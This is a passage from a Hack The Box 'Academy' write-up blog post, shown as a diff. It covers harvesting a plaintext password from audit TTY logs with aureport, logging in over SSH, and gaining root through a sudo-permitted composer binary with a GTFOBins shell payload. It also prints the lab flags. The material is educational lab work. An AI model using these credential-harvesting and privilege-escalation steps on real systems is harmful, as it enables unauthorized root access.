+</span></span><span style="display:flex;"><span>  Processes:               <span style="color:#ae81ff">178</span>
+</span></span><span style="display:flex;"><span>  Users logged in:         <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> ens160: 10.10.10.215
+</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> ens160: dead:beef::250:56ff:feb9:7ea
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Introducing self-healing high availability clustering <span style="color:#66d9ef">for</span> MicroK8s!
+</span></span><span style="display:flex;"><span>   Super simple, hardened and opinionated Kubernetes <span style="color:#66d9ef">for</span> production.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     https://microk8s.io/high-availability
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be installed immediately.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> of these updates are security updates.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Wed Aug <span style="color:#ae81ff">12</span> 21:58:45 <span style="color:#ae81ff">2020</span> from 10.10.14.2
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>$ cat user.txt
+</span></span><span style="display:flex;"><span>c5586378c310b962804e1648f494cc0f
+</span></span></code></pre></div><p>I see the cry0l1t3&rsquo;s groups:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ groups
+</span></span><span style="display:flex;"><span>cry0l1t3 adm
+</span></span><span style="display:flex;"><span>$ 
+</span></span></code></pre></div><p>I use the <code>aureport</code> utility to query and retrieve TTY input records:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ aureport --tty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TTY Report
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># date time event auid term sess comm data</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================</span>
+</span></span><span style="display:flex;"><span>Error opening config file <span style="color:#f92672">(</span>Permission denied<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>NOTE - using built-in logs: /var/log/audit/audit.log
+</span></span><span style="display:flex;"><span>1. 08/12/2020 02:28:10 <span style="color:#ae81ff">83</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> sh <span style="color:#e6db74">&#34;su mrb3n&#34;</span>,&lt;nl&gt;
+</span></span><span style="display:flex;"><span>2. 08/12/2020 02:28:13 <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> su <span style="color:#e6db74">&#34;mrb3n_Ac@d3my!&#34;</span>,&lt;nl&gt;
+</span></span><span style="display:flex;"><span>3. 08/12/2020 02:28:24 <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> sh <span style="color:#e6db74">&#34;whoami&#34;</span>,&lt;nl&gt;
+</span></span><span style="display:flex;"><span>4. 08/12/2020 02:28:28 <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> sh <span style="color:#e6db74">&#34;exit&#34;</span>,&lt;nl&gt;
+</span></span><span style="display:flex;"><span>5. 08/12/2020 02:28:37 <span style="color:#ae81ff">93</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> sh <span style="color:#e6db74">&#34;/bin/bash -i&#34;</span>,&lt;nl&gt;
+</span></span><span style="display:flex;"><span>6. 08/12/2020 02:30:43 <span style="color:#ae81ff">94</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> nano &lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;^X&gt;,<span style="color:#e6db74">&#34;y&#34;</span>,&lt;ret&gt;
+</span></span><span style="display:flex;"><span>7. 08/12/2020 02:32:13 <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> nano &lt;down&gt;,&lt;up&gt;,&lt;up&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;backspace&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;^X&gt;,<span style="color:#e6db74">&#34;y&#34;</span>,&lt;ret&gt;
+</span></span><span style="display:flex;"><span>8. 08/12/2020 02:32:55 <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> nano <span style="color:#e6db74">&#34;6&#34;</span>,&lt;^X&gt;,<span style="color:#e6db74">&#34;y&#34;</span>,&lt;ret&gt;
+</span></span><span style="display:flex;"><span>9. 08/12/2020 02:33:26 <span style="color:#ae81ff">97</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> bash <span style="color:#e6db74">&#34;ca&#34;</span>,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;backspace&gt;,&lt;backspace&gt;,<span style="color:#e6db74">&#34;cat au&#34;</span>,&lt;tab&gt;,<span style="color:#e6db74">&#34;| grep data=&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;cat au&#34;</span>,&lt;tab&gt;,<span style="color:#e6db74">&#34;| cut -f11 -d\&#34; \&#34;&#34;</span>,&lt;ret&gt;,&lt;up&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;left&gt;,&lt;right&gt;,&lt;right&gt;,<span style="color:#e6db74">&#34;grep data= | &#34;</span>,&lt;ret&gt;,&lt;up&gt;,<span style="color:#e6db74">&#34; &gt; /tmp/data.txt&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;id&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;cd /tmp&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;ls&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;nano d&#34;</span>,&lt;tab&gt;,&lt;ret&gt;,<span style="color:#e6db74">&#34;cat d&#34;</span>,&lt;tab&gt;,<span style="color:#e6db74">&#34; | xx&#34;</span>,&lt;tab&gt;,<span style="color:#e6db74">&#34;-r -p&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;ma&#34;</span>,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,<span style="color:#e6db74">&#34;nano d&#34;</span>,&lt;tab&gt;,&lt;ret&gt;,<span style="color:#e6db74">&#34;cat dat&#34;</span>,&lt;tab&gt;,<span style="color:#e6db74">&#34; | xxd -r p&#34;</span>,&lt;ret&gt;,&lt;up&gt;,&lt;left&gt;,<span style="color:#e6db74">&#34;-&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;cat /var/log/au&#34;</span>,&lt;tab&gt;,<span style="color:#e6db74">&#34;t&#34;</span>,&lt;tab&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,<span style="color:#e6db74">&#34;d&#34;</span>,&lt;tab&gt;,<span style="color:#e6db74">&#34;aud&#34;</span>,&lt;tab&gt;,<span style="color:#e6db74">&#34;| grep data=&#34;</span>,&lt;ret&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;down&gt;,&lt;ret&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;ret&gt;,&lt;up&gt;,&lt;up&gt;,&lt;up&gt;,&lt;ret&gt;,<span style="color:#e6db74">&#34;exit&#34;</span>,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,<span style="color:#e6db74">&#34;history&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;exit&#34;</span>,&lt;ret&gt;
+</span></span><span style="display:flex;"><span>10. 08/12/2020 02:33:26 <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> sh <span style="color:#e6db74">&#34;exit&#34;</span>,&lt;nl&gt;
+</span></span><span style="display:flex;"><span>11. 08/12/2020 02:33:30 <span style="color:#ae81ff">107</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> sh <span style="color:#e6db74">&#34;/bin/bash -i&#34;</span>,&lt;nl&gt;
+</span></span><span style="display:flex;"><span>12. 08/12/2020 02:33:36 <span style="color:#ae81ff">108</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> bash <span style="color:#e6db74">&#34;istory&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;history&#34;</span>,&lt;ret&gt;,<span style="color:#e6db74">&#34;exit&#34;</span>,&lt;ret&gt;
+</span></span><span style="display:flex;"><span>13. 08/12/2020 02:33:36 <span style="color:#ae81ff">109</span> <span style="color:#ae81ff">0</span> ? <span style="color:#ae81ff">1</span> sh <span style="color:#e6db74">&#34;exit&#34;</span>,&lt;nl&gt;
+</span></span><span style="display:flex;"><span>$ 
+</span></span></code></pre></div><p>I discover other  credentials:</p>
+<pre tabindex="0"><code> mrb3n:mrb3n_Ac@d3my!
+</code></pre><h2 id="vertical-privilege-escalation">Vertical Privilege Escalation<a href="#vertical-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I login like  mrb3n:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh mrb3n@academy.htb   
+</span></span><span style="display:flex;"><span>mrb3n@academy.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.1 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-52-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System information as of Tue <span style="color:#ae81ff">18</span> Jul <span style="color:#ae81ff">2023</span> 08:08:29 AM UTC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:             0.0
+</span></span><span style="display:flex;"><span>  Usage of /:              44.8% of 15.68GB
+</span></span><span style="display:flex;"><span>  Memory usage:            18%
+</span></span><span style="display:flex;"><span>  Swap usage:              0%
+</span></span><span style="display:flex;"><span>  Processes:               <span style="color:#ae81ff">177</span>
+</span></span><span style="display:flex;"><span>  Users logged in:         <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> ens160: 10.10.10.215
+</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> ens160: dead:beef::250:56ff:feb9:7ea
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Introducing self-healing high availability clustering <span style="color:#66d9ef">for</span> MicroK8s!
+</span></span><span style="display:flex;"><span>   Super simple, hardened and opinionated Kubernetes <span style="color:#66d9ef">for</span> production.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     https://microk8s.io/high-availability
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be installed immediately.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> of these updates are security updates.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Wed Oct <span style="color:#ae81ff">21</span> 10:55:11 <span style="color:#ae81ff">2020</span> from 10.10.14.5
+</span></span><span style="display:flex;"><span>$ whoami                                          
+</span></span><span style="display:flex;"><span>mrb3n
+</span></span></code></pre></div><p>I see all the <code>sudo privileges</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> mrb3n: 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> mrb3n on academy:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User mrb3n may run the following commands on academy:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> /usr/bin/composer
+</span></span><span style="display:flex;"><span>$ 
+</span></span></code></pre></div><p>I see this page <a href="https://gtfobins.github.io/gtfobins/composer/">composer | GTFOBins</a> to exploit this sudo privileges:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>$ echo <span style="color:#e6db74">&#39;{&#34;scripts&#34;:{&#34;x&#34;:&#34;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&#34;}}&#39;</span> &gt;$TF/composer.json
+</span></span><span style="display:flex;"><span>$ sudo composer --working-dir<span style="color:#f92672">=</span>$TF run-script x
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> mrb3n: 
+</span></span><span style="display:flex;"><span>PHP Warning:  PHP Startup: Unable to load dynamic library <span style="color:#e6db74">&#39;mysqli.so&#39;</span> <span style="color:#f92672">(</span>tried: /usr/lib/php/20190902/mysqli.so <span style="color:#f92672">(</span>/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats<span style="color:#f92672">)</span>, /usr/lib/php/20190902/mysqli.so.so <span style="color:#f92672">(</span>/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory<span style="color:#f92672">))</span> in Unknown on line <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>PHP Warning:  PHP Startup: Unable to load dynamic library <span style="color:#e6db74">&#39;pdo_mysql.so&#39;</span> <span style="color:#f92672">(</span>tried: /usr/lib/php/20190902/pdo_mysql.so <span style="color:#f92672">(</span>/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator<span style="color:#f92672">)</span>, /usr/lib/php/20190902/pdo_mysql.so.so <span style="color:#f92672">(</span>/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory<span style="color:#f92672">))</span> in Unknown on line <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Do not run Composer as root/super user! See https://getcomposer.org/root <span style="color:#66d9ef">for</span> details
+</span></span><span style="display:flex;"><span>&gt; /bin/sh -i 0&lt;&amp;<span style="color:#ae81ff">3</span> 1&gt;&amp;<span style="color:#ae81ff">3</span> 2&gt;&amp;<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>I find the <code>root flag</code>:</p>
+<pre tabindex="0"><code># cat /root/root.txt
+8b675a736f5098ab7b1144f033842f36
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/topology/">
+                <span class="button__text">HTB Writeup - Topology (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
